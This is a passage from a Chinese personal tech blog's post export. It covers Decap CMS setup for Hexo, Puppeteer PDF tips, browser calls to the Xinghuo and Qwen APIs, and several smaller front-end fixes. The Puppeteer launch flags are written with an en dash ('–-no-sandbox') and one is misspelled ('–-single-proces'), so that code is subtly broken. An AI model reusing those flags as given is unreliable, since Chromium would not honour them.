快捷键就能插入的图片，在静态博客里需要保存图片，重命名，移动到博客静态资源目录，复制相对路径，粘贴到 ![]() 块中……受不了了，能不能再做个无服务器的内容管理系统？理论可以，但是没那个精力啊…… 探索以下评测的方案，都仅限于 无服务器 方案，有服务器方案不参与评测，原因很简单，我搭建静态博客就是因为它无服务器的优点，如果我有服务器，为什么不直接搭建 Typecho 呢？ 试用过 ChenYFan 大佬开发的两款 Hexo 内容管理工具 HexoPlusPlus，HexoPlusPlus 停止开发之后又推出了 Wexagonal，都不算成熟，对多目录支持不够好，小问题不断，最后还是没能用起来。 再后来听说了 Headless CMS 的概念，也就是无头内容管理系统，和普通博客相比，普通博客输出 HTML 网页，无头博客输出 JSON 内容接口。博客具体长什么样就完全由前端决定了。典型代表是 Ghost，具体可以看他们的教程 Build A Custom Publication With Headless Ghost + Hexo。缺点很明显，CMS 只提供接口，我还需要自己开发插件来调用这些接口获取博客内容，这是个不小的改造，就算改造好了，万一以后 Ghost 停止运营了呢？ 解决怎么办？静态博客就没办法做内容管理了吗？ Git-based CMS 来了，它让我直呼这就是静态博客的终极内容管理方案。 Git-based CMS 就是基于 Git 的内容管理系统，原理是通过前端直接调用诸如 GitHub 等源代码托管网站的 API 来实现内容管理，不需要自己准备服务器。常见的 Git-based CMS 有两个，一个是 decap-cms，一个是 tinacms，以下是我总结出的它们的特点。 名称 前身 特点 Decap CMS Netlify CMS 拥有较多用户，界面简洁，配置难度一般，用一个 js 加一个配置文件实现，2022 年开始停止开发 Tina CMS Forestry.io 后起之秀，编辑器功能更强大，配置难度简单，用专门的中间件实现，截至目前仍在积极开发 我先选择了 Tina，根据官方文档一番操作集成好之后，我遇到了以下问题： Tina 的 markdown 编辑器不支持 md 内嵌 html，比如 Hexo 依赖 &lt;!-- more --&gt; 来实现摘要和正文的分离，这种语法在 Tina 编辑器中直接报错。 子目录支持还没有开发好，需要复杂的配置来支持。 需要项目安装两个包 @tinacms/cli 和 tinacms，感觉有点重。 第二、三个问题还好，第一个问题就比较烦人了，正文都编辑不了怎么玩？ 再试试 Decap，虽然配置起来复杂了些。但用起来总归没出现什么问题。 总结虽然两家 CMS 都没有在文档中写 Hexo 的集成方案，但是和同类的静态博客框架集成是差不多的。如果 Tina 能解决 markdown 非法字符的问题，两家 CMS 都是不错的选择。这里简单总结一下 Decap 与 Hexo 的集成步骤。 重要前提：Hexo 博客源码（不是生成好的 html）托管在 GitHub、GitLab、Bitbucket、Azure 四者之一的源代码托管平台，如果你纠结于选哪个，我推荐：除 GitHub 之外，哪个你访问起来快选哪个。如果你的博客源码还在本地，那我建议你推上去再说，许多小博客停止更新的原因，都是源码找不到了。 为啥我不推荐放 GitHub？因为 Github 的 OAuth 实现 必须要有服务器，这导致配置起来稍微麻烦那么一丢丢，也就一丢丢。如果你已经放到 GitHub 上了，也不用再迁到其他平台的。 还有一个重要前提：博客已经做好了流水线自动部署，如果没有自动部署，你的内容就只会被提交到 Git 仓库，而不会自动发表到网站上。自动部署不是本文重点，你可以看我以前的文章 给Hexo博客配置Azure CI持续集成实现自动部署，或者搜索 Hexo 自动部署，找到各种各样的教程。 Decap 虽然是 Netlify 出品，但并不强依赖 Netlify 的服务，除非你想用 Netlify Identity 做身份认证，或者用 Git Gateway 的后端模式，否则你完全可以不申请 Netlify 账号。 好了，准备好代码仓库和流水线以后，我们正式开始搭建 CMS。 修改 Hexo 配置文件 _config.yml _config.yml1skip_render: admin/**/* 这代表原样输出 source/admin 目录下的文件，不经过 Hexo 的渲染器。如果不配置，后面我们放到 admin 目录下的 yml 配置文件会被 Hexo 转换成 json 文件，影响使用。 如果你的 skip_render 还配置有别的目录，比如 assets，可以这样写 _config.yml1skip_render: (admin|assets)/**/* 创建一个文件 source/admin/index.html，这是内容管理系统的入口文件。 index.html123456789101112&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt; &lt;meta name=&quot;robots&quot; content=&quot;noindex&quot; /&gt; &lt;title&gt;博客管理&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;https://unpkg.com/netlify-cms@^2.0.0/dist/netlify-cms.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 再创建一个文件 source/admin/config.yml，这是内容管理系统的配置文件。 配置文件要按照自己博客的实际情况改写，以下是本博客的配置文件，仅供参考： config.yml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163# https://decapcms.org/docs/configuration-options/backend: name: bitbucket repo: iMaeGoo/blog branch: edit auth_type: implicit app_id: GeCbq2xd5d2s3mQvcNmedia_folder: &quot;source/gallery/2023&quot;public_folder: &quot;/gallery/2023&quot;site_url: &quot;https://www.imaegoo.com&quot;logo_url: &quot;https://www.imaegoo.com/images/logo.png&quot;locale: &quot;zh_Hans&quot;common_col_conf: &amp;common_col_conf create: true slug: &quot;{{fields.filename}}&quot; sortable_fields: - &quot;commit_date&quot; - &quot;title&quot; - &quot;date&quot; - &quot;updated&quot; # https://decapcms.org/docs/widgets/ fields: - label: &quot;文件名&quot; name: &quot;filename&quot; widget: &quot;string&quot; - label: &quot;标题&quot; name: &quot;title&quot; widget: &quot;string&quot; - label: &quot;发表日期&quot; name: &quot;date&quot; widget: &quot;datetime&quot; format: &quot;YYYY-MM-DD HH:mm:ss&quot; date_format: &quot;YYYY-MM-DD&quot; time_format: &quot;HH:mm:ss&quot; - label: &quot;更新日期&quot; name: &quot;updated&quot; widget: &quot;datetime&quot; format: &quot;YYYY-MM-DD HH:mm:ss&quot; date_format: &quot;YYYY-MM-DD&quot; time_format: &quot;HH:mm:ss&quot; required: false - label: &quot;封面&quot; name: &quot;cover&quot; widget: &quot;image&quot; required: false - label: &quot;标签&quot; name: &quot;tags&quot; widget: &quot;select&quot; multiple: true required: false options: - &quot;amazon&quot; - &quot;android&quot; - &quot;angularjs&quot; - &quot;azure&quot; - &quot;cdn&quot; - &quot;chartjs&quot; - &quot;chrome&quot; - &quot;csharp&quot; - &quot;css&quot; - &quot;devops&quot; - &quot;diary&quot; - &quot;docker&quot; - &quot;edge&quot; - &quot;git&quot; - &quot;github&quot; - &quot;hexo&quot; - &quot;html&quot; - &quot;icarus&quot; - &quot;java&quot; - &quot;js&quot; - &quot;life&quot; - &quot;material&quot; - &quot;mysql&quot; - &quot;nodejs&quot; - &quot;onedrive&quot; - &quot;oneindex&quot; - &quot;php&quot; - &quot;restapi&quot; - &quot;security&quot; - &quot;serverless&quot; - &quot;shadowdefender&quot; - &quot;tool&quot; - &quot;twikoo&quot; - &quot;ubuntu&quot; - &quot;vagrant&quot; - &quot;vb&quot; - &quot;vite&quot; - &quot;vue&quot; - &quot;webpack&quot; - &quot;windows&quot; - &quot;xlsx&quot; - &quot;小程序&quot; - label: &quot;分类&quot; name: &quot;categories&quot; widget: &quot;select&quot; multiple: true required: false options: - &quot;Diary&quot; - &quot;Tool&quot; - &quot;Tech&quot; - &quot;FrontEnd&quot; - &quot;BackEnd&quot; - &quot;Windows&quot; - &quot;Android&quot; - &quot;Linux&quot; - &quot;Serverless&quot; - label: &quot;正文&quot; name: &quot;body&quot; widget: &quot;markdown&quot; - label: &quot;原创&quot; name: &quot;toc&quot; widget: &quot;boolean&quot; default: true - label: &quot;评论&quot; name: &quot;comments&quot; widget: &quot;boolean&quot; default: truecollections: - name: &quot;2023&quot; label: &quot;2023&quot; folder: &quot;source/_posts/2023&quot; preview_path: &quot;2023/{{filename}}/&quot; &lt;&lt;: *common_col_conf - name: &quot;2022&quot; label: &quot;2022&quot; folder: &quot;source/_posts/2022&quot; preview_path: &quot;2022/{{filename}}/&quot; &lt;&lt;: *common_col_conf - name: &quot;2021&quot; label: &quot;2021&quot; folder: &quot;source/_posts/2021&quot; preview_path: &quot;2021/{{filename}}/&quot; &lt;&lt;: *common_col_conf - name: &quot;2020&quot; label: &quot;2020&quot; folder: &quot;source/_posts/2020&quot; preview_path: &quot;2020/{{filename}}/&quot; &lt;&lt;: *common_col_conf - name: &quot;2019&quot; label: &quot;2019&quot; folder: &quot;source/_posts/2019&quot; preview_path: &quot;2019/{{filename}}/&quot; &lt;&lt;: *common_col_conf - name: &quot;2018&quot; label: &quot;2018&quot; folder: &quot;source/_posts/2018&quot; preview_path: &quot;2018/{{filename}}/&quot; &lt;&lt;: *common_col_conf - name: &quot;pages&quot; label: &quot;Pages&quot; files: - name: &quot;friends&quot; label: &quot;友链&quot; file: &quot;source/friends/index.md&quot; preview_path: &quot;friends/&quot; &lt;&lt;: *common_col_conf - name: &quot;about&quot; label: &quot;关于&quot; file: &quot;source/about/index.md&quot; preview_path: &quot;about/&quot; &lt;&lt;: *common_col_conf 有关配置文件的介绍，官方文档 已经讲得非常详细了。我再简单介绍一下配置文件的几个部分。 backend 部分是博客托管平台的配置，在我的示例中用的是 bitbucket media_folder 和 public_folder 是图片资源的存放位置和链接前缀 site_url 和 logo_url 是网站地址和 LOGO 的地址 locale 是内容管理系统的显示语言 common_col_conf 是我自己定义的一个块，里面是文章 front-matter 元数据的描述，比如标题、发表日期等 collections 是集合，如果你的博客文章都放到一个目录里，这里就只需要配置一个，如果是像我一样分开放的，那就一个一个都配置上 配置文件配好之后，我们还需要创建一个 OAuth 应用来支持 Decap 访问到我们的博客源码仓库，登录自己的博客源码托管平台，GitHub 参考这个，GitLab 参考这个，Azure 参考这个，Bitbucket 参考这个，以 Bitbucket 为例： 名称描述随意，Callback URL 填写 https://博客地址/admin/，权限选择 Account-Read 和 Pull requests-Write，创建好的 OAuth 应用是这样的： 把回显的 Key 填到 config.yml 的 backend.app_id 里，Secret 不用管。 然后……就没啦！部署博客，然后访问 https://博客地址/admin/ 用 Bitbucket 登录，就可以愉快地进行创作了。","link":"/2023/hexo-decap/"},{"title":"解决 Electron 应用在国产信创 Kylin 系统下 new Date() 时区错误的问题","text":"在做客户端国产化改造时，发现页面上的时间全都差了 8 个小时，打开控制台打印 new Date() 显示的时区是 GMT，进一步测试发现，只有 Kylin 桌面系统上有这个问题，统信 UOS 系统没问题，解决方法很简单，在程序启动前手动指定时区。 main.ts1process.env.TZ = 'Asia/Shanghai';","link":"/2023/kylin-electron-timezone/"},{"title":"分享本站友链页源代码","text":"应博友 Inuyasha 的请求，现分享本站友链页源代码如下。 特性自适应浅色主题和深色主题，自适应内容区宽度，自适应电脑、平板、手机。 效果展示 .friends { display: flex; align-items: stretch; justify-content: space-between; flex-wrap: wrap; margin: -6px; } .friends .friend { margin: 6px; min-width: 240px; flex: 1; display: flex; align-items: center; justify-content: center; border-radius: 10px; border: 1px solid rgba(200, 200, 200, 0.2); background-color: rgba(200, 200, 200, 0.1); position: relative; } .friends .friend.friend-empty { border: none; background: none; } .friends .friend .friend-avatar { flex-shrink: 0; margin: 8px; width: 60px; height: 60px; line-height: 60px; border-radius: 30px; background-color: rgba(200, 200, 200, 0.2); background-size: cover; background-position: center; font-size: 24px; text-align: center; } .friends .friend .friend-detail { flex: 1; width: 0; display: flex; flex-direction: column; margin: 8px 8px 8px 0; } .friends .friend .friend-pop { position: absolute; width: 100%; left: 0; bottom: 0; } .friends .friend .friend-pop div { position: absolute; width: 100%; top: 8px; left: 0; padding: 8px; color: rgba(255, 255, 255, 0.9); border-radius: 10px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); background-color: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); z-index: 10; user-select: none; pointer-events: none; transition: opacity 0.5s; opacity: 0; } .friends .friend:hover .friend-pop div { opacity: 1; } iMaeGoo's Blog&nbsp; www.imaegoo.com 签名: 虹墨空间站 友 友链 A&nbsp; example.com 友链 C example.com 签名: 只是一个示例 用法如果是在 Hexo 中使用，请将代码放到 123{% raw %}......{% endraw %} 代码块中。 特别声明以下友链页样式代码都是我原创设计开发的，采用 MIT 协议开源，不适用于本站全局声明的 CC BY 4.0 协议，喜欢的朋友可以直接复制，无需署名。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;style type=&quot;text/css&quot;&gt;.friends { display: flex; align-items: stretch; justify-content: space-between; flex-wrap: wrap; margin: -6px;}.friends .friend { margin: 6px; min-width: 240px; flex: 1; display: flex; align-items: center; justify-content: center; border-radius: 10px; border: 1px solid rgba(200, 200, 200, 0.2); background-color: rgba(200, 200, 200, 0.1); position: relative;}.friends .friend.friend-empty { border: none; background: none;}.friends .friend .friend-avatar { flex-shrink: 0; margin: 8px; width: 60px; height: 60px; line-height: 60px; border-radius: 30px; background-color: rgba(200, 200, 200, 0.2); background-size: cover; background-position: center; font-size: 24px; text-align: center;}.friends .friend .friend-detail { flex: 1; width: 0; display: flex; flex-direction: column; margin: 8px 8px 8px 0;}.friends .friend .friend-pop { position: absolute; width: 100%; left: 0; bottom: 0;}.friends .friend .friend-pop div { position: absolute; width: 100%; top: 8px; left: 0; padding: 8px; color: rgba(255, 255, 255, 0.9); border-radius: 10px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); background-color: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); z-index: 10; user-select: none; pointer-events: none; transition: opacity 0.5s; opacity: 0;}.friends .friend:hover .friend-pop div { opacity: 1;}&lt;/style&gt;&lt;div class=&quot;friends&quot;&gt; &lt;div class=&quot;friend&quot;&gt; &lt;div class=&quot;friend-avatar&quot; style=&quot;background-image: url('https://www.imaegoo.com/images/avatar.jpg')&quot;&gt;&lt;/div&gt; &lt;div class=&quot;friend-detail&quot;&gt; &lt;div&gt;iMaeGoo's Blog&amp;nbsp;&lt;a class=&quot;has-text-grey&quot; target=&quot;_blank&quot; href=&quot;https://www.imaegoo.com/atom.xml&quot;&gt;&lt;i class=&quot;fas fa-rss&quot; title=&quot;支持 RSS&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt; &lt;div&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://www.imaegoo.com&quot;&gt;www.imaegoo.com&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;friend-pop&quot;&gt;&lt;div&gt;签名: 虹墨空间站&lt;/div&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;friend&quot;&gt; &lt;div class=&quot;friend-avatar&quot;&gt;友&lt;/div&gt; &lt;div class=&quot;friend-detail&quot;&gt; &lt;div&gt;友链 A&amp;nbsp;&lt;a class=&quot;has-text-grey&quot; target=&quot;_blank&quot; href=&quot;https://example.com/feed/&quot;&gt;&lt;i class=&quot;fas fa-rss&quot; title=&quot;支持 RSS&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt; &lt;div&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://example.com&quot;&gt;example.com&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;friend&quot;&gt; &lt;div class=&quot;friend-avatar&quot; style=&quot;background-image: url('https://picsum.photos/200')&quot;&gt;&lt;/div&gt; &lt;div class=&quot;friend-detail&quot;&gt; &lt;div&gt;友链 C&lt;/div&gt; &lt;div&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://example.com&quot;&gt;example.com&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;friend-pop&quot;&gt;&lt;div&gt;签名: 只是一个示例&lt;/div&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;friend friend-empty&quot;&gt;&lt;/div&gt; &lt;div class=&quot;friend friend-empty&quot;&gt;&lt;/div&gt; &lt;div class=&quot;friend friend-empty&quot;&gt;&lt;/div&gt;&lt;/div&gt;","link":"/2023/my-friend-page-src/"},{"title":"关于友链和域名","text":"关于友链截至 2023-10-11，本站共有 80 条正常状态的友链，超过半数为被动交换。挨个回访耗时较长，所以多数友链并不能及时回访。在此呼吁各位站长朋友开通博客的 RSS 功能，以方便其他朋友通过阅读器爬取您的最新文章。 我是如何管理这么多友链的？ 答案是用 vika 管理友链表 用 inoreader 爬取最新文章 用自己开发的脚本，从 vika api 获取友链表，生成友链页 markdown 关于域名出售2023 年 9 月底似乎不少博主收到了收购网站的消息，具体目的不明（有懂的可以说一下吗？）。本站也收到了类似消息。 在此说明：本站域名和网站不会出售。如果您打算出售的网站在本站的友链页中，请务必告知本站更新友链或下线友链。","link":"/2023/october-daily/"},{"title":"解决 Sublime 4 标签栏中文字体上下错位问题","text":"由于 notepad++ 的流氓行为，我被迫改用 sublime 4 作为主力文本编辑器。 问题如图，标签栏中的“编码”二字比后面的“安全指南”要高一像素，非常难看。 搜索互联网，得到的解决方案是添加一项配置： 1&quot;font_options&quot;: [&quot;gdi&quot;] 或者 12&quot;font_face&quot;: &quot;中文字体&quot;,&quot;font_size&quot;: 16, 这似乎是针对正文区的配置，对于标签栏并不起作用，于是我继续研究，发现了以下解决方法，针对标签栏： 点击 菜单 - 设置 - 定制配色方案 加入以下配置，如果已有其他配置请自行合并 12345678910111213141516{ &quot;variables&quot;: { // 注意以下这个字体不是 Windows 内置的字体， // 如果你没有这个字体，请换成其他已安装的支持中文的字体，如“等线” &quot;font_face&quot;: &quot;Microsoft YaHei Mono&quot; }, &quot;rules&quot;: [ { &quot;class&quot;: &quot;tab_label&quot;, &quot;font.face&quot;: &quot;var(font_face)&quot;, &quot;font.size&quot;: &quot;var(font_size)&quot; } ]} 效果如图，舒服多了","link":"/2023/sublime-ui-chn-misplaced/"},{"title":"Puppeteer 踩坑笔记","text":"Puppeteer 是最常见的服务端 Node.js 网页转 PDF 工具库之一，原理是启动 Chromium 无头模式，打开网页，输出PDF，由于其原理是直接操控浏览器，导出的 PDF 几乎和网页效果一致。本篇记录一下踩坑经历。 我的 Puppeteer 版本：19.4.1 无法安装 puppeteer Node.js 要求 &gt;=14.1.0 Puppeteer 安装过程中默认访问 Google 服务器下载 Chromium 安装包，建议切换到阿里源进行安装。 1npm config set PUPPETEER_DOWNLOAD_HOST=https://registry.npmmirror.com/-/binary 启动 Chrome 没反应puppeteer.launch 指定了 Chrome 浏览器路径，启动后任务管理器进程中有 chrome.exe 但代码不往下走 必须使用 Chromium 或者 Chrome Canary（金丝雀）版本，不要使用 Chrome 正式版。 Linux 系统服务器无法启动 Chromium安装 Chromium 所需的运行依赖，以下是 RedHat Enterprise 需要安装的依赖。 12yum install -y alsa-lib.x86_64 atk.x86_64 cups-libs.x86_64 gtk3.x86_64 ipa-gothic-fonts libXcomposite.x86_64 libXcursor.x86_64 libXdamage.x86_64 libXext.x86_64 libXi.x86_64 libXrandr.x86_64 libXScrnSaver.x86_64 libXtst.x86_64 pango.x86_64 xorg-x11-fonts-100dpi xorg-x11-fonts-75dpi xorg-x11-fonts-cyrillic xorg-x11-fonts-misc xorg-x11-fonts-Type1 xorg-x11-utilsyum install -y at-spi2-atk libxkbcommon-x11 libgbm 另外，有些 Linux 内核不支持 sandbox，还需要在 Chromium 启动参数里加 --no-sandbox --disable-setuid-sandbox Linux 系统服务器导出的 PDF 缺字、口口、字体异常从 Windows 复制宋体、黑体、微软雅黑等常用字体到 Linux /usr/share/fonts/ 下，然后执行 12345yum install -y fontconfig mkfontscalecd /usr/share/fontsmkfontscalemkfontdirfc-cache 导出的 PDF 是空白通常是单页面应用还没有加载完就触发了导出造成的，可以通过等待页面指定元素出现再导出来解决。 1234567await browserPage.goto('http://localhost:8080', { waitUntil: 'networkidle2' });// 解决页面未加载完成时，直接导出的 PDF 空白的问题await browserPage.mainFrame().waitForSelector('.xxx-container');await browserPage.pdf({ format: 'A4', // ...}); 性能优化容器运行 Chromium 无头浏览器推荐添加的参数 12345678910111213141516const browser = await puppeteer.launch({ args: [ // 解决 brwoser.newPage() 卡死的问题 '–-disable-gpu', '–-no-zygote', // 容器的 /dev/shm 分区默认只有 64M 不够用，禁用这个分区 '–-disable-dev-shm-usage', // 解决某些服务器 Linux 发行版不支持沙盒启动的问题 '–-no-sandbox', '–-disable-setuid-sandbox', // 加快启动速度 '–-no-first-run', // 单进程启动，好维护 '–-single-proces', ]}); 最后放一个完整的代码示例1234567891011121314151617181920212223242526272829303132333435363738394041console.log('Starting Chromium...');const browser = await puppeteer.launch({ // 如果是手动安装的 chromium，需要传路径 // 如果是自动安装的 Chromium，不需要传 executablePath executablePath: 'D:\\\\Software\\\\Chromium\\\\chrome.exe', // 在某些Linux发行版下需要加以下参数才能启动 args: [ // 解决 brwoser.newPage() 卡死的问题 '–-disable-gpu', '–-no-zygote', // 容器的 /dev/shm 分区默认只有 64M 不够用，禁用这个分区 '–-disable-dev-shm-usage', // 解决某些服务器 Linux 发行版不支持沙盒启动的问题 '–-no-sandbox', '–-disable-setuid-sandbox', // 加快启动速度 '–-no-first-run', // 单进程启动，好维护 '–-single-proces', ],});console.log('Started chromium');try { const browserPage = await browser.newPage(); browserPage.setDefaultNavigationTimeout(0); // 传需要转 PDF 的页面地址 await browserPage.goto('http://localhost:8080', { waitUntil: 'networkidle2', }); // 解决页面未加载完成时，直接导出的 PDF 空白的问题 await browserPage.mainFrame().waitForSelector('.xxx-container'); // 传 PDF 的存放位置等选项 await browserPage.pdf({ path: 'filename.pdf', format: 'A4', }); console.log('Generated PDF');} finally { await browser.close(); console.log('Closed Chromium');} 总之，遇到问题时多打日志，更容易分析具体是哪一步出的问题。","link":"/2023/puppeteer-note/"},{"title":"讯飞星火、阿里云通义千问 Web 端调用示例","text":"正在开发一个问答小网页，需要接入大模型，查看了： 讯飞星火的调用文档: https://www.xfyun.cn/doc/spark/Web.html 通义千问的调用文档: https://help.aliyun.com/zh/dashscope/developer-reference/api-details 发现官方文档对于前端浏览器直接调用 API 的示例都写得不够清楚，所以在此重新封装了示例。 星火用的是 WebSocket 协议，千问用的是 Server-Sent Events，也就是 SSE。 注意：示例中直接把密钥写进了前端代码，生产环境不推荐这么做，建议通过 nginx 代理等方式将密钥注入请求。 截图 讯飞星火开通服务: https://xinghuo.xfyun.cn/sparkapi ai-xinghuo.ts123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130import CryptoJS from &quot;crypto-js&quot;;import type { ChatHistory } from &quot;./ai&quot;;const URL = &quot;wss://spark-api.xf-yun.com/v3.1/chat&quot;;const APPID = &quot;&quot;;const API_SECRET = &quot;&quot;;const API_KEY = &quot;&quot;;export function callXinghuo({ text, history, onMessage,}: { text: string; history: ChatHistory; onMessage: (msg: string) =&gt; void;}) { return new Promise((resolve, reject) =&gt; { let fullMsg = &quot;&quot;; const webSocket = new WebSocket(getWebSocketUrl()); webSocket.onmessage = (e) =&gt; { try { const resultData = e.data; const jsonData = JSON.parse(resultData); if (jsonData.header.code === 0) { const msg = getContent(jsonData); console.log(&quot;Got message&quot;, msg); fullMsg += msg; onMessage(msg); if (jsonData.header.status === 2) { console.log(&quot;API response finished&quot;, fullMsg); webSocket.close(); resolve(fullMsg); } } else { const error = new Error( `${jsonData.header.code}:${jsonData.header.message}`, ); console.error(&quot;API error:&quot;, error); reject(error); } } catch (e) { console.error(&quot;Handle message exception:&quot;, e); reject(e); } }; webSocket.onerror = (e) =&gt; { console.error(&quot;WebSocket error:&quot;, e); reject(e); }; webSocket.onopen = () =&gt; { console.log(&quot;WebSocket open&quot;); webSocket.send(getParams(text, history)); }; webSocket.onclose = () =&gt; { console.log(&quot;WebSocket close&quot;); }; });}function getWebSocketUrl() { var host = location.host; var date = new Date().toUTCString(); var algorithm = &quot;hmac-sha256&quot;; var headers = &quot;host date request-line&quot;; var signatureOrigin = `host: ${host}\\ndate: ${date}\\nGET /v3.1/chat HTTP/1.1`; var signatureSha = CryptoJS.HmacSHA256(signatureOrigin, API_SECRET); var signature = CryptoJS.enc.Base64.stringify(signatureSha); var authorizationOrigin = `api_key=&quot;${API_KEY}&quot;, algorithm=&quot;${algorithm}&quot;, headers=&quot;${headers}&quot;, signature=&quot;${signature}&quot;`; var authorization = btoa(authorizationOrigin); return `${URL}?authorization=${authorization}&amp;date=${date}&amp;host=${host}`;}function getParams(message: string, history: ChatHistory) { return JSON.stringify({ header: { app_id: APPID, uid: &quot;fd3f47e40d&quot;, }, parameter: { chat: { domain: &quot;generalv3&quot;, temperature: 0.5, max_tokens: 1024, }, }, payload: { message: { text: getPayloadText(message, history), }, }, });}function getContent(jsonData: any) { let content = &quot;&quot;; try { if (jsonData.header.code === 0) { for (const choice of jsonData.payload.choices.text) { content += choice.content; } } } catch (e) { console.error(&quot;Get content error:&quot;, e); } return content;}function getPayloadText(text: string, history: ChatHistory) { const array = []; // 排除最后一条 history，因为是本次刚发的消息 for (let i = 0; i &lt; history.length - 1; i++) { const chat = history[i]; array.push( { role: &quot;user&quot;, content: chat.userMsg, }, { role: &quot;assistant&quot;, content: chat.assistantMsg, }, ); } array.push({ role: &quot;user&quot;, content: text, }); return array;} 阿里云通义千问开通服务: https://dashscope.console.aliyun.com/overview ai-qwen.ts12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import type { ChatHistory } from &quot;./ai&quot;;// 直接调会跨域，需要配反代const URL = &quot;https://dashscope.aliyuncs.com/api/v1/services/aigc/text-generation/generation&quot;;const API_KEY = &quot;&quot;;export async function callQwen({ text, history, onMessage,}: { text: string; history: ChatHistory; onMessage: (msg: string) =&gt; void;}) { const response = await fetch(URL, { method: &quot;POST&quot;, headers: { Authorization: `Bearer ${API_KEY}`, &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;X-DashScope-SSE&quot;: &quot;enable&quot;, }, body: getParams(text, history), }); const reader = response.body?.getReader(); if (!reader) return; while (true) { const { value, done } = await reader.read(); const utf8Decoder = new TextDecoder(&quot;utf-8&quot;); const resultText = value ? utf8Decoder.decode(value, { stream: true }) : &quot;&quot;; try { const data = getResult(resultText); console.log(&quot;qwen data&quot;, data); if (data.output.text) { onMessage(data.output.text); } } catch (e) {} if (done) { break; } }}function getParams(message: string, history: ChatHistory) { return JSON.stringify({ model: &quot;qwen-max&quot;, input: { prompt: message, history: getHistory(history), }, parameters: { incremental_output: true, }, });}function getHistory(history: ChatHistory) { const array = []; // 排除最后一条 history，因为是本次刚发的消息 for (let i = 0; i &lt; history.length - 1; i++) { const chat = history[i]; array.push({ user: chat.userMsg, bot: chat.assistantMsg, }); } return array;}function getResult(resultText: string) { const lines = resultText.split(&quot;\\n&quot;); for (const line of lines) { if (line.startsWith(&quot;data:&quot;)) { const data = JSON.parse(line.slice(5)); return data; } }} 调用代码1234567891011121314try { await callAi({ text: '你好吗', history: [{ userMsg: '你好', assistantMsg: '你好呀', }], onMessage: (msg) =&gt; { console.log(msg); }, });} catch (e: any) { console.error(e);}","link":"/2023/xinghuo-web/"},{"title":"Vue 2 this.$emit 方法无效问题的解决","text":"分享一个 Vue 2 $emit 不生效问题的解决，子组件向父组件 $emit 事件，没有报错，但父组件就是收不到事件。首先排除拼错事件名称等基本错误。 最终发现原因是：由于我将 $emit 写在了异步方法里，子组件在还没 $emit 之前就销毁了，此时再调用 $emit 不会有任何报错，也不会有任何效果，特此记录。 子组件 123456// 这是一个菜单组件，假设某个菜单项被点击async menuItemClick() { this.$emit('close') // 先关闭菜单，这里的 $emit 可以起效，父组件接收到 close 后将子组件的 v-if 置为 false，即子组件被销毁 await this.doSomething() // 执行一些异步方法 this.$emit('finish') // 这里 $emit 不起效，因为子组件已销毁} 父组件 123456&lt;dropdown-menu v-if=&quot;menuVisible&quot; @close=&quot;menuVisible = false&quot; @finish=&quot;doSomething()&quot;&gt;&lt;/dropdown-menu&gt;&lt;!-- doSomething() 不会被执行--&gt; 解决方法有两种，一种是将父组件中的 v-if 换成 v-show 以避免子组件销毁，另一种是延迟销毁，即父组件接收到以上示例的 close 事件时先不销毁子组件，接收到 finish 时再销毁。 后记：如果 Vue 能在 “调用已销毁组件的 emit 方法” 时打印一个警告，这个问题就更容易被发现了。","link":"/2023/vue2-emit/"},{"title":"初识 monorepo，用 yarn 搭建一个 monorepo 项目","text":"目录结构12345678- package.json- packages - core - package.json - bridge - package.json - shared - package.json 最外层的 package.json1234567{ &quot;workspaces&quot;: { &quot;packages&quot;: [ &quot;packages/*&quot; ] }} 内部包之间的依赖例如 @monorepo-demo/core 要依赖 @monorepo-demo/shared 12345{ &quot;dependencies&quot;: { &quot;@monorepo-demo/shared&quot;: &quot;workspace:*&quot; }} workspace:* 标志在发包的时候会被自动替换成对应的版本号，参考这里。 在根目录下运行 yarn workspace &lt;workspace-name&gt; &lt;command&gt; 来执行任何子项目中定义的命令。例如： 1yarn workspace @monorepo-demo/core dev 这会运行 core 子项目中定义的 dev 命令。","link":"/2023/yarn-workspace/"},{"title":"我对抄袭行为的看法","text":"写技术文章，几乎不可避免会被抄袭。我已经遇到过无数次文章被抄袭，抄袭者会将文章标记为“原创”，甚至在文中加入微信二维码、培训机构广告，见怪不怪。 一直以来我都容忍抄袭行为，我不会去向平台举报，因为 Hexo 博客文章的发布时间可以随意修改，我无法证明文章是我写的，也无法证明我比抄袭者更早地发布。 但抄袭依然正在打击我的创作热情，发布频率越来越低，文章质量也逐步下降，我会去想：反正写得太好了，最后也会变成别人的，那只要做个记录，以后自己能看懂就行了，写得差点还能降低被抄袭的概率。 就这样，变成了现在这样。 